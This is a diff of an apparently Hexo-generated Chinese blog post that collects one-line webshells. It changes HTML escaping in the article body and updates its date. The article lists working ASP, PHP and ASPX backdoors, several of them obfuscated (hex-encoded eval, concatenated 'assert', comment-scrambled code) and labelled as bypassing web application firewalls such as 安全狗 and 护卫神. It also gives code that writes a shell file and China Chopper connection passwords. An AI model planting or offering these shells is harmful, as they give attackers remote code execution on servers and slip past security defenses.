@@ -297,7 +297,7 @@
 	更新于
 	<a href="/2018/10/22/一句话木马的整理/" itemprop="url">
 		<time datetime="2018-10-22T11:20:11.000Z" itemprop="dateUpdated">
-	  		2019-04-03
+	  		2019-04-05
 	  </time>
 	</a> 	
 
@@ -334,61 +334,62 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<pre><code>【 一句话木马 】
-asp一句话木马：&lt;%eval request(&quot;x&quot;)%&gt;
-php一句话木马：&lt;?php eval($_POST[g]);?&gt;
-aspx一句话：&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;
+		<pre class="line-numbers language-txt"><code class="language-txt">【 一句话木马 】
+asp一句话木马：<%eval request("x")%>
+php一句话木马：<?php eval($_POST[g]);?>
+aspx一句话：<%@ Page Language="Jscript"%><%eval(Request.Item["x"],"unsafe");%>
 数据库加密一句话(密码a)：┼攠數畣整爠煥敵瑳∨≡┩愾
-网站配置、版权信息专用一句话：&quot;%&gt;&lt;%Eval Request(x)%&gt;
-一句话再过护卫神：&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;
-过拦截一句话木马：&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;
-asp闭合型一句话 %&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%
+网站配置、版权信息专用一句话："%><%Eval Request(x)%>
+一句话再过护卫神：<%Y=request("x")%> <%execute(Y)%>
+过拦截一句话木马：<% eXEcGlOBaL ReQuEsT("x") %>
+asp闭合型一句话 %><%eval request("0o1Znz1ow")%><%
 能过安全狗的解析格式：;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg
-突破安全狗的一句话：&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;
-elong过安全狗的php一句话：&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;
+突破安全狗的一句话：<%Y=request("x")%> <%eval(Y)%>
+elong过安全狗的php一句话：<?php  $a = "a"."s"."s"."e"."r"."t";  $a($_POST[cc]);  ?>
 后台常用写入php一句话（密码x）：
-&lt;?
-$fp = @fopen(&quot;c.php&quot;, &#39;a&#39;);
-@fwrite($fp, &#39;&lt;&#39;.&#39;?php&#39;.&quot;\r\n\r\n&quot;.&#39;eval($_POST[x])&#39;.&quot;\r\n\r\n?&quot;.&quot;&gt;\r\n&quot;);
+<?
+$fp = @fopen("c.php", 'a');
+@fwrite($fp, '<'.'?php'."\r\n\r\n".'eval($_POST[x])'."\r\n\r\n?".">\r\n");
 @fclose($fp);
-?&gt;
+?>
 高强度php一句话：
-&lt;?php substr(md5($_REQUEST[&#39;heroes&#39;]),28)==&#39;acd0&#39;&amp;&amp;eval($_REQUEST[&#39;c&#39;]);?&gt;
+<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>
 新型变异PHP一句话(密码b4dboy):
-($b4dboy = $_POST[&#39;b4dboy&#39;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);
+($b4dboy = $_POST['b4dboy']) && @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);
 突破安全狗的aspx一句话：
-&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;
-&lt;%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%&gt;
+<%@ Page Language="C#" ValidateRequest="false" %>
+<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["你的密码"].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
 突破护卫神，保护盾一句话：
-&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);
-$a($_POST[&quot;test&quot;]); ?&gt;
+<?php $a = str_replace(x,"","axsxxsxexrxxt");
+$a($_POST["test"]); ?>
 许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。
-改成：〈scriptlanguage=VBScript runat=server〉execute request(&quot;l&quot;)〈/Script〉
+改成：〈scriptlanguage=VBScript runat=server〉execute request("l")〈/Script〉
 这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的。
 PHP高强度一句话：
-&lt;?php substr(md5($_REQUEST[&#39;x&#39;]),28)==&#39;acd0&#39;&amp;&amp;eval($_REQUEST[&#39;c&#39;]);?&gt;   菜刀连接：/x.php?x=lostwolf  脚本类型：php  密码：c
-&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;    菜刀连接 躲避检测 密码：
+<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>   菜刀连接：/x.php?x=lostwolf  脚本类型：php  密码：c
+<?php assert($_REQUEST["c"]);?>    菜刀连接 躲避检测 密码：
 
 
-2017年：过狗一句话：&lt;?php eval(&quot;\x24\x5f\x50\x4f\x53\x54\x5b\x27\x63\x6d\x64\x27\x5d&quot;); ?&gt;  //密码cmd
+2017年：过狗一句话：<?php eval("\x24\x5f\x50\x4f\x53\x54\x5b\x27\x63\x6d\x64\x27\x5d"); ?>  //密码cmd
 
-&lt;?php                  
-@$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;                  
-@$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;                  
-@$_/*-/*-*/($/*-/*-*/{&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;}                  
-[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?&gt;
+<?php                  
+@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";                  
+@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";                  
+@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}                  
+[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>
 
 
 密码-7
 
 php执行代码插入一句话
-&lt;?php fputs(fopen(&quot;./shell.php&quot;,&quot;w&quot;),  &quot;&lt;?php   eval(\$_POST[1]); ?&gt;&quot;        );?&gt;
+<?php fputs(fopen("./shell.php","w"),  "<?php   eval(\$_POST[1]); ?>"        );?>
 
 js调用php一句话木马
-&lt;scRipt language=&quot;Php&quot;&gt; 
+<scRipt language="Php"> 
 eval($_POST[pass]);
-&lt;/scRipt&gt;
-</code></pre>	
+</scRipt>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
 	</div>
 	
 	<div id="current-post-cover" data-scr="/images/post-cover/16.jpg"></div>
@@ -572,6 +573,7 @@ function ge...
 						</a>
 						<p>
 							知识储备strcmp()函数int strcmp ( string $str1 , string $str2 )
+
 说明
 注意该比较区分大小写。
 参数
@@ -580,7 +582,7 @@ str1
 str2
 第二个字符串。
 返回值
-strcmp二进制安全字...
+strcmp二进制安全...
 						</p>
 					</div>
 
@@ -598,10 +600,11 @@ strcmp二进制安全字...
 						<p>
 							序列化在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。
 序列化函数：string serialize ( mixed $value )
+
 说明：
 返回对象的字符串表示。 
 返回值：
-返回对象的字符串表示或...
+返回对象的字符串表示...
 						</p>
 					</div>
 
